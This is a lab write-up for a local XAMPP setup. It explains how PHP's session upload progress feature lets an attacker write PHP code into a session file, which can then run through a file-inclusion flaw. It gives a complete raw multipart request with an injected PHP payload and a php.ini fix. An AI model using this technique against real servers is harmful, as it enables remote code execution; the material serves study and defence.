# 🧪 Lab: PHP Session Upload Progress & File Poisoning

> **Target:** Local PHP 8.2 Engine (XAMPP environment at `E:\xmapp`)  
> **Server URL:** `http://localhost:8000/index.php`  
> **Session Path:** `E:\xmapp\tmp\`

---

## 🧠 The Mechanics: What Actually Happens Under The Hood

When `session.upload_progress.enabled = 1` is turned on in PHP (the default on most systems):

1. An attacker sends a `multipart/form-data` POST request.
2. The request specifies a session cookie:
   ```http
   Cookie: PHPSESSID=hacker123
   ```
3. Inside the multipart form body, before the file, the attacker adds a parameter named:
   ```text
   PHP_SESSION_UPLOAD_PROGRESS
   ```
4. Even if `index.php` **does not have any upload form or session code**, the underlying PHP interpreter automatically intercepts this parameter and creates:
   ```text
   E:\xmapp\tmp\sess_hacker123
   ```
5. Inside that file, PHP writes whatever value was passed in `PHP_SESSION_UPLOAD_PROGRESS`!
6. If the attacker passes `<?php phpinfo(); ?>`, PHP writes raw PHP code into the session file.
7. If an LFI (Local File Inclusion) or memory leak exists, requesting `?page=E:/xmapp/tmp/sess_hacker123` executes the code!

---

## 🚀 Live Hands-On Testing

### Option A: The Automated Test Script
Run:
```powershell
python test_payload.py
```

### Option B: Using Burp Suite Repeater
Send this exact raw request to `http://localhost:8000/index.php`:

```http
POST /index.php HTTP/1.1
Host: localhost:8000
Cookie: PHPSESSID=burphacker1
Content-Type: multipart/form-data; boundary=---------------------------123456789
Content-Length: 420

-----------------------------123456789
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php echo "=== PWNED VIA BURP SUITE! ==="; ?>
-----------------------------123456789
Content-Disposition: form-data; name="file"; filename="dummy.txt"
Content-Type: text/plain

Sample data
-----------------------------123456789--
```

Then check `E:\xmapp\tmp\sess_burphacker1`!

---

## 🛡️ The Defense (Mitigation)

In `php.ini`:
```ini
; Disable this legacy feature completely:
session.upload_progress.enabled = Off
```
Or update the PHP binary to the latest patched release.
